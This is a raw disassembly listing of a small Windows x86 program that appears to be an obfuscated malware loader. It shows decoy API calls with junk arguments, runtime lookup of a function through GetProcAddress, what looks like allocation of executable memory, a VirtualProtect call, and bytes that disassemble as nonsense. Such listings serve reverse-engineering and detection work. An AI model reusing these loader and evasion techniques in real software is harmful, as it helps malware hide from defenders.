0x00401000:	pushl	%ebp	; from: 0x0040282a(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -24(%ebp)
0x0040100e:	movl	$0x0, -8(%ebp)
0x00401015:	movl	$0x0, -4(%ebp)
0x0040101c:	movl	$0x0, -20(%ebp)
0x00401023:	movl	$0x0, -72(%ebp)
0x0040102a:	movl	$0x0, -80(%ebp)
0x00401031:	movl	$0x0, -112(%ebp)
0x00401038:	movl	$0x0, -68(%ebp)
0x0040103f:	movl	$0x0, -60(%ebp)
0x00401046:	movl	$0x0, -16(%ebp)
0x0040104d:	movl	$0x0, -56(%ebp)
0x00401054:	movl	$0x0, -76(%ebp)
0x0040105b:	movl	$0x0, -108(%ebp)
0x00401062:	movl	$0x0, -64(%ebp)
0x00401069:	movl	$0x0, -32(%ebp)
0x00401070:	movl	$0x0, -28(%ebp)
0x00401077:	movl	$0x0, -104(%ebp)
0x0040107e:	movl	$0x0, -12(%ebp)
0x00401085:	movl	0x0044581c, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x00445820, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x00445824, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x00445828, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x0044582c, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x00445830, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x00445834, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x00445838, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x0044583a, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -28(%ebp)
0x004010dc:	leal	-28(%ebp), %eax
0x004010df:	pushl	%eax
0x004010e0:	leal	-12(%ebp), %ecx
0x004010e3:	pushl	%ecx
0x004010e4:	pushl	$0x4
0x004010e6:	call	CopySid@advapi32.dll	; targets: 0xff000150(MAY)
0x004010ec:	testl	%eax, %eax
0x004010ee:	je	0x0040111d	; targets: 0x0040111d(MAY), 0x004010f0(MAY)
0x004010f0:	pushl	$0xffff	; from: 0x004010ee(MAY)
0x004010f5:	pushl	$0x0
0x004010f7:	pushl	$0x1
0x004010f9:	call	HeapCreate@kernel32.dll	; targets: 0xff000090(MAY)
0x004010ff:	movl	%eax, -80(%ebp)
0x00401102:	movl	-12(%ebp), %edx
0x00401105:	addl	$0x1, %edx
0x00401108:	movl	%edx, -12(%ebp)
0x0040110b:	pushl	$0x3
0x0040110d:	pushl	$0x0
0x0040110f:	pushl	$0x2
0x00401111:	movl	-12(%ebp), %eax
0x00401114:	pushl	%eax
0x00401115:	pushl	$0x0
0x00401117:	call	AddAce@advapi32.dll	; targets: 0xff000060(MAY)
0x0040111d:	call	GetLastError@kernel32.dll	; targets: 0xff000190(MAY)	; from: 0x004010ee(MAY)
0x00401123:	movl	%eax, -32(%ebp)
0x00401126:	movzwl	-32(%ebp), %ecx
0x0040112a:	cmpl	$0x7a, %ecx
0x0040112d:	jne	0x00401157	; targets: 0x00401157(MAY), 0x0040112f(MAY)
0x0040112f:	movl	$0xe0d, -24(%ebp)	; from: 0x0040112d(MAY)
0x00401136:	movl	$0x3a, -64(%ebp)
0x0040113d:	movb	$0x0, -36(%ebp)
0x00401141:	movl	$0x71cd9846, -8(%ebp)
0x00401148:	call	GetCommandLineA@kernel32.dll	; targets: 0xff000030(MAY)
0x0040114e:	movl	$0xf9d87, -112(%ebp)
0x00401155:	jmp	0x00401188	; targets: 0x00401188(MAY)
0x00401157:	movb	$0x0, 0x0041ef60	; from: 0x0040112d(MAY)
0x0040115e:	pushl	$0x405a18
0x00401163:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000c0(MAY)
0x00401169:	movl	%eax, -32(%ebp)
0x0040116c:	pushl	$0x0
0x0040116e:	pushl	$0xa
0x00401170:	pushl	$0x0
0x00401172:	pushl	$0x0
0x00401174:	call	CreateSemaphoreA@kernel32.dll	; targets: 0xff000140(MAY)
0x0040117a:	pushl	$0x41ef60
0x0040117f:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000c0(MAY)
0x00401185:	movl	%eax, -32(%ebp)
0x00401188:	pushl	GetModuleHandleA@kernel32.dll	; from: 0x00401155(MAY)
0x0040118e:	popl	%edx
0x0040118f:	movl	%edx, -104(%ebp)
0x00401192:	movl	-80(%ebp), %edx
0x00401195:	pushl	%edx
0x00401196:	pushl	$0x0
0x00401198:	pushl	$0x0
0x0040119a:	movl	-108(%ebp), %eax
0x0040119d:	pushl	%eax
0x0040119e:	call	0x0040293e	; targets: 0x0040293e(MAY)
0x004011a3:	pushl	$0x0
0x004011a5:	call	IsIconic@user32.dll	; targets: 0xff000130(MAY)
0x004011ab:	pushl	$0x44583c
0x004011b0:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000c0(MAY)
0x004011b6:	movl	%eax, -80(%ebp)
0x004011b9:	leal	-48(%ebp), %ecx
0x004011bc:	pushl	%ecx
0x004011bd:	movl	-80(%ebp), %edx
0x004011c0:	pushl	%edx
0x004011c1:	call	GetProcAddress@kernel32.dll	; targets: 0xff000040(MAY)
0x004011c7:	movl	%eax, -52(%ebp)
0x004011ca:	pushl	-28(%ebp)
0x004011cd:	pushl	$0x1000
0x004011d2:	movl	-24(%ebp), %eax
0x004011d5:	addl	$0x46, %eax
0x004011d8:	pushl	%eax
0x004011d9:	pushl	$0x0
0x004011db:	movl	-52(%ebp), %ebx
0x004011de:	call	%ebx	; targets: unresolved

start:
0x004012ad:	pushl	%ebp
0x004012ae:	movl	%esp, %ebp
0x004012b0:	subl	$0x54, %esp
0x004012b3:	movl	$0x0, -52(%ebp)
0x004012ba:	movl	$0x0, -4(%ebp)
0x004012c1:	movl	$0x0, -76(%ebp)
0x004012c8:	movl	$0x0, -48(%ebp)
0x004012cf:	movl	$0x0, -80(%ebp)
0x004012d6:	pushl	$0x66
0x004012d8:	pushl	$0x0
0x004012da:	call	LoadIconA@user32.dll	; targets: 0xff000160(MAY)
0x004012e0:	pushl	$0x0
0x004012e2:	pushl	$0x0
0x004012e4:	movl	-80(%ebp), %eax
0x004012e7:	pushl	%eax
0x004012e8:	call	0x00402944	; targets: 0x00402944(MAY)
0x004012ed:	leal	-72(%ebp), %ecx
0x004012f0:	pushl	%ecx
0x004012f1:	call	GetSystemTime@kernel32.dll	; targets: 0xff0000e0(MAY)
0x004012f7:	call	GetLastError@kernel32.dll	; targets: 0xff000190(MAY)
0x004012fd:	movl	%eax, -48(%ebp)
0x00401300:	pushl	$0x8
0x00401302:	leal	-44(%ebp), %edx
0x00401305:	pushl	%edx
0x00401306:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff0000a0(MAY)
0x0040130c:	movl	-52(%ebp), %eax
0x0040130f:	pushl	%eax
0x00401310:	call	0x00401367	; targets: 0x00401367(MAY)
0x00401315:	addl	$0x4, %esp	; from: 0x00402840(MAY)
0x00401318:	call	0x00402841	; targets: 0x00402841(MAY)
0x0040131d:	movl	-76(%ebp), %ecx	; from: 0x0040284f(MAY)
0x00401320:	pushl	%ecx
0x00401321:	call	HeapLock@kernel32.dll	; targets: 0xff000120(MAY)
0x00401327:	movl	%eax, -80(%ebp)
0x0040132a:	movl	$0x0, -84(%ebp)
0x00401331:	jmp	0x0040133c	; targets: 0x0040133c(MAY)
0x00401333:	movl	-84(%ebp), %edx	; from: 0x00401342(MAY)
0x00401336:	addl	$0x1, %edx
0x00401339:	movl	%edx, -84(%ebp)
0x0040133c:	cmpl	$0x64, -84(%ebp)	; from: 0x00401331(MAY)
0x00401340:	jae	0x00401344	; targets: 0x00401342(MAY)
0x00401342:	jmp	0x00401333	; targets: 0x00401333(MAY)	; from: 0x00401340(MAY)
0x00401367:	pushl	%ebp	; from: 0x00401310(MAY)
0x00401368:	movl	%esp, %ebp
0x0040136a:	subl	$0x40, %esp
0x0040136d:	pushl	%esi
0x0040136e:	movl	$0x0, -64(%ebp)
0x00401375:	movl	$0x0, -32(%ebp)
0x0040137c:	movl	$0x0, -60(%ebp)
0x00401383:	movl	$0x0, -40(%ebp)
0x0040138a:	movl	$0x0, -52(%ebp)
0x00401391:	movl	$0x0, -44(%ebp)
0x00401398:	movl	$0x7c996e23, -40(%ebp)
0x0040139f:	movl	$0x44584c, -48(%ebp)
0x004013a6:	pushl	$0x0
0x004013a8:	call	ResetEvent@kernel32.dll	; targets: 0xff0001a0(MAY)
0x004013ae:	movl	$0x0, -56(%ebp)
0x004013b5:	movl	-40(%ebp), %eax
0x004013b8:	movl	%eax, -36(%ebp)
0x004013bb:	movl	$0x0, -4(%ebp)
0x004013c2:	movl	GetLastError@kernel32.dll, %ecx
0x004013c8:	movl	%ecx, -4(%ebp)
0x004013cb:	pushl	$0x0
0x004013cd:	pushl	$0x4e
0x004013cf:	pushl	$0x1e
0x004013d1:	pushl	$0x0
0x004013d3:	call	VirtualProtect@kernel32.dll	; targets: 0xff000010(MAY)
0x004013d9:	testl	%eax, %eax
0x004013db:	je	0x00402818	; targets: 0x00402818(MAY), 0x004013e1(MAY)
0x004013e1:	subl	0xfe9dd8f(%ebx), %ebx	; from: 0x004013db(MAY)
0x004013e7:	stosb	%al, %es:(%edi)
0x004013e8:	popl	%ecx
0x004013e9:	xchgl	%eax, %esi
0x00402818:	movl	-4(%ebp), %esi	; from: 0x004013db(MAY)
0x0040281b:	call	%esi	; targets: 0xff000190(MAY)
0x0040281d:	movl	%eax, -60(%ebp)
0x00402820:	cmpl	$0x57, -60(%ebp)
0x00402824:	jne	0x0040283a	; targets: 0x00402826(MAY), 0x0040283a(MAY)
0x00402826:	movl	-36(%ebp), %edx	; from: 0x00402824(MAY)
0x00402829:	pushl	%edx
0x0040282a:	call	0x00401000	; targets: 0x00401000(MAY)
0x0040283a:	xorl	%eax, %eax	; from: 0x00402824(MAY)
0x0040283c:	popl	%esi
0x0040283d:	movl	%ebp, %esp
0x0040283f:	popl	%ebp
0x00402840:	ret	; targets: 0x00401315(MAY)

0x00402841:	pushl	%ebp	; from: 0x00401318(MAY)
0x00402842:	movl	%esp, %ebp
0x00402844:	subl	$0x124, %esp
0x0040284a:	xorl	%eax, %eax
0x0040284c:	movl	%ebp, %esp
0x0040284e:	popl	%ebp
0x0040284f:	ret	; targets: 0x0040131d(MAY)

0x0040293e:	jmp	GetModuleInformation@psapi.dll	; targets: 0xff0000f0(MAY)	; from: 0x0040119e(MAY)
0x00402944:	jmp	GetProcessMemoryInfo@psapi.dll	; targets: 0xff0000d0(MAY)	; from: 0x004012e8(MAY)
